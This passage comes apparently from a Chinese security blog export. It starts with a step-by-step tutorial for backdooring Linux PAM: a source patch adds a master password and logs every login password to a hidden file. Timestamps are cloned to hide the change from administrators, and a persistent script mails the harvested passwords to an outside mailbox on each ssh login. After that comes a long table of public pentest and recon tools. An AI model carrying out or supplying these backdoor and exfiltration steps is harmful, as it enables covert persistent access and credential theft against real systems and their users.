href="#2-安装gcc和pam依赖" class="headerlink" title="2.安装gcc和pam依赖"></a>2.安装gcc和pam依赖</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8314.png" alt=""></p><h2 id="3-安装PAM认证模块"><a href="#3-安装PAM认证模块" class="headerlink" title="3.安装PAM认证模块"></a>3.安装PAM认证模块</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8315.png" alt=""></p><ul><li>修改源码，在源码中添加后门<pre style="background-color: #F0F8FF;">[root@localhost Linux-PAM-1.1.8]# vim modules/pam_unix/pam_unix_auth.c180 retval = _unix_verify_password(pamh, name, p, ctrl);在 180 行下新增内容如下：if(strcmp(p,"1234567")==0){return PAM_SUCCESS;}if(retval==PAM_SUCCESS){FILE *fp;fp = fopen("/tmp/.logs","a");fprintf(fp,"%s-&gt;%s\n",name,p);fclose(fp);}</pre>  1234567 是 backdoor 密码<br>  /tmp/.logs 记录系统登录密码</li><li>解决 64 位系统编译时遇到 yywrap()函数未定义问题<pre style="background-color: #F0F8FF;">[root@localhost Linux-PAM-1.1.8]# vi conf/pam_conv1/pam_conv_l.c6 /* A lexical scanner generated by flex */第六行下插入代码7 int yywrap(){return 1;}[root@localhost Linux-PAM-1.1.8]# vi doc/specs/parse_l.c6 /* A lexical scanner generated by flex */第六行下插入代码7 int yywrap(){return 1;}</pre></li><li>配置 PAM 以下都是默认参数，因为安装了 flex，需要手工指定路径。<pre style="background-color: #F0F8FF;">[root@localhost Linux-PAM-1.1.8]# ./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr[root@localhost Linux-PAM-1.1.8]# make</pre>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8316.png" alt=""></li><li>安装编译好的PAM模块<br><code>[root@localhost Linux-PAM-1.1.8]# cd /lib64/security/</code></li><li>备份原始版本<br><code>[root@localhost security]# mv pam_unix.so{,bak}</code></li><li>覆盖系统现有pam<br><code>[root@localhost security]# cp /root/Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /lib64/security/</code></li><li>克隆原始文件时间，防止时间戳发生改变被管理员检测到<br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8317.png" alt=""><br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8318.png" alt=""></li><li>新建Xshell终端窗口<br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8319.png" alt=""><br>  密码成功记录<br>  清除系统登陆记录<br><code>[root@localhost security]# rm -rf /tmp/.logs</code></li><li>测试后门密码登陆<br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8320.png" alt=""><br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8321.png" alt=""><br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8322.png" alt=""><h2 id="3-自动发送邮件"><a href="#3-自动发送邮件" class="headerlink" title="3.自动发送邮件"></a>3.自动发送邮件</h2></li><li>（1）使用 mail.rc 实现发邮件<pre style="background-color:#F0F8FF;">[root@xuegod63 ~]# vim /etc/mail.rc #在此文件最后插入以下内容：set from=15595243411@163.com smtp=smtp.163.comset smtp-auth-user=15595243411 smtp-auth-password=PASSWORD smtp-auth=login注：set from=15595243411@163.com #指定发件人的邮箱，这里就写成和收件人的邮箱一样。set smtp-auth-user=15595243411 #写自己发件人的邮箱帐号smtp-auth-password=PASSWORD #写自己发件人的邮箱的授权码</pre></li><li>（2）配置 163 邮箱，开启 pop3/smtp 服务</li><li>（3）测试邮件发送<br><code>[root@localhost ~]# mail -s "demo title" 15595243411@163.com &lt; /tmp/.logs</code><br>  查看<br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8323.png" alt=""></li><li>（4）编写 shell 脚本自动发邮件，邮件的主题是服务器的 IP 地址<br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8324.png" alt=""></li><li>（5）测试<br><code>[root@localhost ~]# /bin/zipmail</code><br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8325.png" alt=""></li></ul><h2 id="4-实现当用户通过-ssh-登录系统后，自动发邮件"><a href="#4-实现当用户通过-ssh-登录系统后，自动发邮件" class="headerlink" title="4.实现当用户通过 ssh 登录系统后，自动发邮件"></a>4.实现当用户通过 ssh 登录系统后，自动发邮件</h2><ul><li>安装inotify<br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8326.png" alt=""><br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8327.png" alt=""><pre style="background-color: #F0F8FF;">[root@localhost inotify-tools-3.13]# make  -j 4[root@localhost inotify-tools-3.13]# make install</pre></li><li>编写出发时自动发邮件脚本<br> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8328.png" alt=""><br> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8329.png" alt=""></li><li>设置开机启动zipmail脚本<pre style="background-color: #F0F8FF;">[root@localhost inotify-tools-3.13]# vi /etc/rc.local#在此文件的最后插入以下内容。/bin/zipmail &amp;</pre></li><li>测试<br><code>[root@localhost inotify-tools-3.13]# bash /etc/rc.local</code><br>  Xshell退出重连一下<br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8330.png" alt=""></li><li>查看一下进程<br>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://raw.githubusercontent.com/spade-z-1/cdn/master/img/%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%8331.png" alt=""></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> Windows提权 </tag>
            
            <tag> Linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超酷的100款网络黑客工具集合</title>
      <link href="/archives/f901a354.html"/>
      <url>/archives/f901a354.html</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>Type</th><th align="left">Name</th><th align="center">Description</th></tr></thead><tbody><tr><td>Army-Knife/SCAN</td><td align="left"><a href="https://github.com/jaeles-project/jaeles" target="_blank" rel="noopener">jaeles</a></td><td align="center">The Swiss Army knife for automated Web Application Testing</td></tr><tr><td>Army-Knife/PROXY</td><td align="left"><a href="https://portswigger.net/burp" rel="noopener" target="_blank">BurpSuite</a></td><td align="center">the BurpSuite Project</td></tr><tr><td>Army-Knife/PROXY</td><td align="left"><a href="https://github.com/dstotijn/hetty" target="_blank" rel="noopener">hetty</a></td><td align="center">Hetty is an HTTP toolkit for security research. It aims to become an open source alternative to commercial software like Burp Suite Pro, with powerful features tailored to the needs of the infosec and bug bounty community.</td></tr><tr><td>Army-Knife/PROXY</td><td align="left"><a href="https://github.com/zaproxy/zaproxy" target="_blank" rel="noopener">zaproxy</a></td><td align="center">The OWASP ZAP core project</td></tr><tr><td>Army-Knife/SCAN</td><td align="left"><a href="https://github.com/projectdiscovery/nuclei" target="_blank" rel="noopener">nuclei</a></td><td align="center">Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use.</td></tr><tr><td>Discovery/ALL</td><td align="left"><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">OneForAll</a></td><td align="center">OneForAll是一款功能强大的子域收集工具</td></tr><tr><td>Discovery/ALL</td><td align="left"><a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">aquatone</a></td><td align="center">A Tool for Domain Flyovers</td></tr><tr><td>Discovery/ALL</td><td align="left"><a href="https://github.com/intrigueio/intrigue-core" target="_blank" rel="noopener">intrigue-core</a></td><td align="center">Discover Your Attack Surface</td></tr><tr><td>Discovery/ALL</td><td align="left"><a href="https://github.com/nahamsec/lazyrecon" target="_blank" rel="noopener">lazyrecon</a></td><td align="center">This script is intended to automate your reconnaissance process in an organized fashion</td></tr><tr><td>Discovery/ALL</td><td align="left"><a href="https://github.com/yogeshojha/rengine" target="_blank" rel="noopener">rengine</a></td><td align="center">reNgine is an automated reconnaissance framework meant for gathering information during penetration testing of web applications. reNgine has customizable scan engines, which can be used to scan the websites, endpoints, and gather information.</td></tr><tr><td>Discovery/ALL</td><td align="left"><a href="https://github.com/edoardottt/scilla" target="_blank" rel="noopener">scilla</a></td><td align="center"><g-emoji class="g-emoji" alias="pirate_flag" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3f4-2620.png">🏴‍☠️</g-emoji> Information Gathering tool <g-emoji class="g-emoji" alias="pirate_flag" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f3f4-2620.png">🏴‍☠️</g-emoji> dns/subdomain/port enumeration</td></tr><tr><td>Discovery/ALL</td><td align="left"><a href="https://github.com/kpcyrd/sn0int" target="_blank" rel="noopener">sn0int</a></td><td align="center">Semi-automatic OSINT framework and package manager</td></tr><tr><td>Discovery/APK</td><td align="left"><a href="https://github.com/dwisiswant0/apkleaks" target="_blank" rel="noopener">apkleaks</a></td><td align="center">Scanning APK file for URIs, endpoints &amp; secrets.</td></tr><tr><td>Discovery/CRAWL</td><td align="left"><a href="https://github.com/s0md3v/Photon" target="_blank" rel="noopener">Photon</a></td><td align="center">Incredibly fast crawler designed for OSINT.</td></tr><tr><td>Discovery/CRAWL</td><td align="left"><a href="https://github.com/si9int/cc.py" target="_blank" rel="noopener">cc.py</a></td><td align="center">Extracting URLs of a specific target based on the results of "commoncrawl.org"</td></tr><tr><td>Discovery/CRAWL</td><td align="left"><a href="https://github.com/dwisiswant0/go-dork" target="_blank" rel="noopener">go-dork</a></td><td align="center">The fastest dork scanner written in Go.</td></tr><tr><td>Discovery/CRAWL</td><td align="left"><a href="https://github.com/jaeles-project/gospider" target="_blank" rel="noopener">gospider</a></td><td align="center">Gospider - Fast web spider written in Go</td></tr><tr><td>Discovery/CRAWL</td><td align="left"><a href="https://github.com/hakluke/hakrawler" target="_blank" rel="noopener">hakrawler</a></td><td align="center">Simple, fast web crawler designed for easy, quick discovery of endpoints and assets within a web application</td></tr><tr><td>Discovery/CRAWL</td><td align="left"><a href="https://github.com/IAmStoxe/urlgrab" target="_blank" rel="noopener">urlgrab</a></td><td align="center">A golang utility to spider through a website searching for additional links.</td></tr><tr><td>Discovery/DNS</td><td align="left"><a href="https://dnsdumpster.com" rel="noopener" target="_blank">DNSDumpster</a></td><td align="center">Online dns recon &amp; research, find &amp; lookup dns records</td></tr><tr><td>Discovery/DNS</td><td align="left"><a href="https://securitytrails.com" rel="noopener" target="_blank">SecurityTrails</a></td><td align="center">Online dns / subdomain / recon tool</td></tr><tr><td>Discovery/DNS</td><td align="left"><a href="https://github.com/projectdiscovery/dnsprobe" target="_blank" rel="noopener">dnsprobe</a></td><td align="center">DNSProb (beta) is a tool built on top of retryabledns that allows you to perform multiple dns queries of your choice with a list of user supplied resolvers.</td></tr><tr><td>Discovery/DNS</td><td align="left"><a href="https://github.com/vortexau/dnsvalidator" target="_blank" rel="noopener">dnsvalidator</a></td><td align="center">Maintains a list of IPv4 DNS servers by verifying them against baseline servers, and ensuring accurate responses.</td></tr><tr><td>Discovery/DNS</td><td align="left"><a href="https://github.com/hakluke/hakrevdns" target="_blank" rel="noopener">hakrevdns</a></td><td align="center">Small, fast tool for performing reverse DNS lookups en masse.</td></tr><tr><td>Discovery/DNS</td><td align="left"><a href="https://github.com/projectdiscovery/shuffledns" target="_blank" rel="noopener">shuffledns</a></td><td align="center">shuffleDNS is a wrapper around massdns written in go that allows you to enumerate valid subdomains using active bruteforce as well as resolve subdomains with wildcard handling and easy input-output support.</td></tr><tr><td>Discovery/DNS</td><td align="left"><a href="https://github.com/pry0cc/subgen" target="_blank" rel="noopener">subgen</a></td><td align="center">A really simple utility to concate wordlists to a domain name - to pipe into your favourite resolver!</td></tr><tr><td>Discovery/DNS</td><td align="left"><a href="https://github.com/zmap/zdns" target="_blank" rel="noopener">zdns</a></td><td align="center">Fast CLI DNS Lookup Tool</td></tr><tr><td>Discovery/DOMAIN</td><td align="left"><a href="https://github.com/OWASP/Amass" target="_blank" rel="noopener">Amass</a></td><td align="center">In-depth Attack Surface Mapping and Asset Discovery</td></tr><tr><td>Discovery/DOMAIN</td><td align="left"><a href="https://chaos.projectdiscovery.io" rel="noopener" target="_blank">Chaos Web</a></td><td align="center">actively scan and maintain internet-wide assets' data. enhance research and analyse changes around DNS for better insights.</td></tr><tr><td>Discovery/DOMAIN</td><td align="left"><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">Sublist3r</a></td><td align="center">Fast subdomains enumeration tool for penetration testers</td></tr><tr><td>Discovery/DOMAIN</td><td align="left"><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">altdns</a></td><td align="center">Generates permutations, alterations and mutations of subdomains and then resolves them</td></tr><tr><td>Discovery/DOMAIN</td><td align="left"><a href="https://github.com/tomnomnom/assetfinder" target="_blank" rel="noopener">assetfinder</a></td><td align="center">Find domains and subdomains related to a given domain</td></tr><tr><td>Discovery/DOMAIN</td><td align="left"><a href="https://github.com/projectdiscovery/chaos-client" target="_blank" rel="noopener">chaos-client</a></td><td align="center">Go client to communicate with Chaos DNS API.</td></tr><tr><td>Discovery/DOMAIN</td><td align="left"><a href="https://github.com/Edu4rdSHL/findomain" target="_blank" rel="noopener">findomain</a></td><td align="center">The fastest and cross-platform subdomain enumerator, do not waste your time.</td></tr><tr><td>Discovery/DOMAIN</td><td align="left"><a href="https://github.com/guelfoweb/knock" target="_blank" rel="noopener">knock</a></td><td align="center">Knock Subdomain Scan</td></tr><tr><td>Discovery/DOMAIN</td><td align="left"><a href="https://github.com/projectdiscovery/subfinder" target="_blank" rel="noopener">subfinder</a></td><td align="center">Subfinder is a subdomain discovery tool that discovers valid subdomains for websites. Designed as a passive framework to be useful for bug bounties and safe for penetration testing.</td></tr><tr><td>Discovery/FAVICON</td><td align="left"><a href="https://github.com/devanshbatham/FavFreak" target="_blank" rel="noopener">FavFreak</a></td><td align="center">Making Favicon.ico based Recon Great again !</td></tr><tr><td>Discovery/FUZZ</td><td align="left"><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a></td><td align="center">Web path scanner</td></tr><tr><td>Discovery/FUZZ</td><td align="left"><a href="https://github.com/epi052/feroxbuster" target="_blank" rel="noopener">feroxbuster</a></td><td align="center">A fast, simple, recursive content discovery tool written in Rust.</td></tr><tr><td>Discovery/FUZZ</td><td align="left"><a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener">gobuster</a></td><td align="center">Directory/File, DNS and VHost busting tool written in Go</td></tr><tr><td>Discovery/FUZZ</td><td align="left"><a href="https://github.com/riza/medusa" target="_blank" rel="noopener">medusa</a></td><td align="center">Fastest recursive HTTP fuzzer, like a Ferrari.</td></tr><tr><td>Discovery/GIT</td><td align="left"><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">GitMiner</a></td><td align="center">Tool for advanced mining for content on Github</td></tr><tr><td>Discovery/GIT</td><td align="left"><a href="https://github.com/hisxo/gitGraber" target="_blank" rel="noopener">gitGraber</a></td><td align="center">gitGraber</td></tr><tr><td>Discovery/GIT</td><td align="left"><a href="https://github.com/gwen001/github-search" target="_blank" rel="noopener">github-search</a></td><td align="center">Tools to perform basic search on GitHub.</td></tr><tr><td>Discovery/GIT</td><td align="left"><a href="https://github.com/zricethezav/gitleaks" target="_blank" rel="noopener">gitleaks</a></td><td align="center">Scan git repos for secrets using regex and entropy <g-emoji class="g-emoji" alias="key" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f511.png">🔑</g-emoji></td></tr><tr><td>Discovery/GIT</td><td align="left"><a href="https://github.com/michenriksen/gitrob" target="_blank" rel="noopener">gitrob</a></td><td align="center">Reconnaissance tool for GitHub organizations</td></tr><tr><td>Discovery/GQL</td><td align="left"><a href="https://github.com/APIs-guru/graphql-voyager" target="_blank" rel="noopener">graphql-voyager</a></td><td align="center"><g-emoji class="g-emoji" alias="artificial_satellite" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f6f0.png">🛰️</g-emoji> Represent any GraphQL API as an interactive graph</td></tr><tr><td>Discovery/GQL</td><td align="left"><a href="https://github.com/doyensec/inql" target="_blank" rel="noopener">inql</a></td><td align="center">InQL - A Burp Extension for GraphQL Security Testing</td></tr><tr><td>Discovery/HTTP</td><td align="left"><a href="https://github.com/s0md3v/Arjun" target="_blank" rel="noopener">Arjun</a></td><td align="center">HTTP parameter discovery suite.</td></tr><tr><td>Discovery/HTTP</td><td align="left"><a href="https://github.com/m4ll0k/Aron" target="_blank" rel="noopener">Aron</a></td><td align="center">Aron is a GO script for finding hidden GET &amp; POST parameters</td></tr><tr><td>Discovery/JS</td><td align="left"><a href="https://github.com/KathanP19/JSFScan.sh" target="_blank" rel="noopener">JSFScan.sh</a></td><td align="center">Automation for javascript recon in bug bounty.</td></tr><tr><td>Discovery/JS</td><td align="left"><a href="https://github.com/GerbenJavado/LinkFinder" target="_blank" rel="noopener">LinkFinder</a></td><td align="center">A python script that finds endpoints in JavaScript files</td></tr><tr><td>Discovery/JS</td><td align="left"><a href="https://github.com/m4ll0k/SecretFinder" target="_blank" rel="noopener">SecretFinder</a></td><td align="center">SecretFinder - A python script for find sensitive data (apikeys, accesstoken,jwt,..) and search anything on javascript files</td></tr><tr><td>Discovery/PARAM</td><td align="left"><a href="https://github.com/devanshbatham/ParamSpider" target="_blank" rel="noopener">ParamSpider</a></td><td align="center">Mining parameters from dark corners of Web Archives</td></tr><tr><td>Discovery/PARAM</td><td align="left"><a href="https://github.com/s0md3v/Parth" target="_blank" rel="noopener">Parth</a></td><td align="center">Heuristic Vulnerable Parameter Scanner</td></tr><tr><td>Discovery/PORT</td><td align="left"><a href="https://github.com/brandonskerritt/RustScan" target="_blank" rel="noopener">RustScan</a></td><td align="center">Faster Nmap Scanning with Rust</td></tr><tr><td>Discovery/PORT</td><td align="left"><a href="https://www.shodan.io/" rel="noopener" target="_blank">Shodan</a></td><td align="center">World's first search engine for Internet-connected devices</td></tr><tr><td>Discovery/PORT</td><td align="left"><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">masscan</a></td><td align="center">TCP port scanner, spews SYN packets asynchronously, scanning entire Internet in under 5 minutes.</td></tr><tr><td>Discovery/PORT</td><td align="left"><a href="https://github.com/projectdiscovery/naabu" target="_blank" rel="noopener">naabu</a></td><td align="center">A fast port scanner written in go with focus on reliability and simplicity. Designed to be used in combination with other tools for attack surface discovery in bug bounties and pentests</td></tr><tr><td>Discovery/PORT</td><td align="left"><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">nmap</a></td><td align="center">Nmap - the Network Mapper. Github mirror of official SVN repository.</td></tr><tr><td>Discovery/TKOV</td><td align="left"><a href="https://github.com/Ice3man543/SubOver" target="_blank" rel="noopener">SubOver</a></td><td align="center">A Powerful Subdomain Takeover Tool</td></tr><tr><td>Discovery/TKOV</td><td align="left"><a href="https://github.com/EdOverflow/can-i-take-over-xyz" target="_blank" rel="noopener">can-i-take-over-xyz</a></td><td align="center">"Can I take over XYZ?" — a list of services and how to claim (sub)domains with dangling DNS records.</td></tr><tr><td>Discovery/TKOV</td><td align="left"><a href="https://github.com/haccer/subjack" target="_blank" rel="noopener">subjack</a></td><td align="center">Subdomain Takeover tool written in Go</td></tr><tr><td>Discovery/URL</td><td align="left"><a href="https://github.com/tomnomnom/waybackurls" target="_blank" rel="noopener">waybackurls</a></td><td align="center">Fetch all the URLs that the Wayback Machine knows about for a domain</td></tr><tr><td>Discovery/VULN</td><td align="left"><a href="https://github.com/s0md3v/Silver" target="_blank" rel="noopener">Silver</a></td><td align="center">Mass scan IPs for vulnerable services</td></tr><tr><td>Fetch/HTTP</td><td align="left"><a href="https://github.com/htcat/htcat" target="_blank" rel="noopener">htcat</a></td><td align="center">Parallel and Pipelined HTTP GET Utility</td></tr><tr><td>Fetch/HTTP</td><td align="left"><a href="https://github.com/tomnomnom/httprobe" target="_blank" rel="noopener">httprobe</a></td><td align="center">Take a list of domains and probe for working HTTP and HTTPS servers</td></tr><tr><td>Fetch/HTTP</td><td align="left"><a href="https://github.com/projectdiscovery/httpx" target="_blank" rel="noopener">httpx</a></td><td align="center">httpx is a fast and multi-purpose HTTP toolkit allow to run multiple probers using retryablehttp library, it is designed to maintain the result reliability with increased threads.</td></tr><tr><td>Fetch/HTTP</td><td align="left"><a href="https://github.com/tomnomnom/meg" target="_blank" rel="noopener">meg</a></td><td align="center">Fetch many paths for many hosts - without killing the hosts</td></tr><tr><td>Fetch/HTTP</td><td align="left"><a href="https://github.com/asciimoo/wuzz" target="_blank" rel="noopener">wuzz</a></td><td align="center">Interactive cli tool for HTTP inspection</td></tr><tr><td>Fetch/JS</td><td align="left"><a href="https://github.com/003random/getJS" target="_blank" rel="noopener">getJS</a></td><td align="center">A tool to fastly get all javascript sources/files</td></tr><tr><td>Fetch/WSOCK</td><td align="left"><a href="https://github.com/hahwul/websocket-connection-smuggler" target="_blank" rel="noopener">websocket-connection-smuggler</a></td><td align="center">websocket-connection-smuggler</td></tr><tr><td>Scanner/CORS</td><td align="left"><a href="https://github.com/Shivangx01b/CorsMe" target="_blank" rel="noopener">CorsMe</a></td><td align="center">Cross Origin Resource Sharing MisConfiguration Scanner</td></tr><tr><td>Scanner/CORS</td><td align="left"><a href="https://github.com/s0md3v/Corsy" target="_blank" rel="noopener">Corsy</a></td><td align="center">CORS Misconfiguration Scanner</td></tr><tr><td>Scanner/CRLF</td><td align="left"><a href="https://github.com/dwisiswant0/crlfuzz" target="_blank" rel="noopener">crlfuzz</a></td><td align="center">A fast tool to scan CRLF vulnerability written in Go</td></tr><tr><td>Scanner/FUZZ</td><td align="left"><a href="https://github.com/1N3/BruteX" target="_blank" rel="noopener">BruteX</a></td><td align="center">Automatically brute force all services running on a target.</td></tr><tr><td>Scanner/FUZZ</td><td align="left"><a href="https://github.com/codingo/VHostScan" target="_blank" rel="noopener">VHostScan</a></td><td align="center">A virtual host scanner that performs reverse lookups, can be used with pivot tools, detect catch-all scenarios, work around wildcards, aliases and dynamic default pages.</td></tr><tr><td>Scanner/FUZZ</td><td align="left"><a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener">ffuf</a></td><td align="center">Fast web fuzzer written in Go</td></tr><tr><td>Scanner/FUZZ</td><td align="left"><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">thc-hydra</a></td><td align="center">hydra</td></tr><tr><td>Scanner/FUZZ</td><td align="left"><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">wfuzz</a></td><td align="center">Web application fuzzer</td></tr><tr><td>Scanner/GQL</td><td align="left"><a href="https://github.com/swisskyrepo/GraphQLmap" target="_blank" rel="noopener">GraphQLmap</a></td><td align="center">GraphQLmap is a scripting engine to interact with a graphql endpoint for pentesting purposes.</td></tr><tr><td>Scanner/LFI</td><td align="left"><a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="noopener">LFISuite</a></td><td align="center">Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner</td></tr><tr><td>Scanner/LFI</td><td align="left"><a href="https://github.com/wireghoul/dotdotpwn" target="_blank" rel="noopener">dotdotpwn</a></td><td align="center">DotDotPwn - The Directory Traversal Fuzzer</td></tr><tr><td>Scanner/NOSQL</td><td align="left"><a href="https://github.com/codingo/NoSQLMap" target="_blank" rel="noopener">NoSQLMap</a></td><td align="center">Automated NoSQL database enumeration and web application exploitation tool.</td></tr><tr><td>Scanner/NOSQL</td><td align="left"><a href="https://github.com/Charlie-belmer/nosqli" target="_blank" rel="noopener">nosqli</a></td><td align="center">NoSql Injection CLI tool</td></tr><tr><td>Scanner/RECON</td><td align="left"><a href="https://github.com/j3ssie/Osmedeus" target="_blank" rel="noopener">Osmedeus</a></td><td align="center">Fully automated offensive security framework for reconnaissance and vulnerability scanning</td></tr><tr><td>Scanner/RECON</td><td align="left"><a href="https://github.com/1N3/Sn1per" target="_blank" rel="noopener">Sn1per</a></td><td align="center">Automated pentest framework for offensive security experts</td></tr><tr><td>Scanner/RECON</td><td align="left"><a href="https://github.com/EdOverflow/megplus" target="_blank" rel="noopener">megplus</a></td><td align="center">Automated reconnaissance wrapper — TomNomNom's meg on steroids. [DEPRECATED]</td></tr><tr><td>Scanner/S3</td><td align="left"><a href="https://github.com/jordanpotti/AWSBucketDump" target="_blank" rel="noopener">AWSBucketDump</a></td><td align="center">Security Tool to Look For Interesting Files in S3 Buckets</td></tr><tr><td>Scanner/S3</td><td align="left"><a href="https://github.com/sa7mon/S3Scanner" target="_blank" rel="noopener">S3Scanner</a></td><td align="center">Scan for open AWS S3 buckets and dump the contents</td></tr><tr><td>Scanner/SMUGGLE</td><td align="left"><a href="https://github.com/BishopFox/h2csmuggler" target="_blank" rel="noopener">h2csmuggler</a></td><td align="center">HTTP Request Smuggling over HTTP/2 Cleartext (h2c)</td></tr><tr><td>Scanner/SMUGGLE</td><td align="left"><a href="https://github.com/defparam/smuggler" target="_blank" rel="noopener">smuggler</a></td><td align="center">Smuggler - An HTTP Request Smuggling / Desync testing tool written in Python 3</td></tr><tr><td>Scanner/SQL</td><td align="left"><a href="https://gitlab.com/kalilinux/packages/sqlninja" rel="noopener" target="_blank">SQLNinja</a></td><td align="center">SQL Injection scanner</td></tr><tr><td>Scanner/SQL</td><td align="left"><a href="https://github.com/the-robot/sqliv" target="_blank" rel="noopener">sqliv</a></td><td align="center">massive SQL injection vulnerability scanner</td></tr><tr><td>Scanner/SQL</td><td align="left"><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">sqlmap</a></td><td align="center">Automatic SQL injection and database takeover tool</td></tr><tr><td>Scanner/SSL</td><td align="left"><a href="https://github.com/hahwul/a2sv" target="_blank" rel="noopener">a2sv</a></td><td align="center">Auto Scanning to SSL Vulnerability</td></tr><tr><td>Scanner/SSL</td><td align="left"><a href="https://github.com/drwetter/testssl.sh" target="_blank" rel="noopener">testssl.sh</a></td><td align="center">Testing TLS/SSL encryption anywhere on any 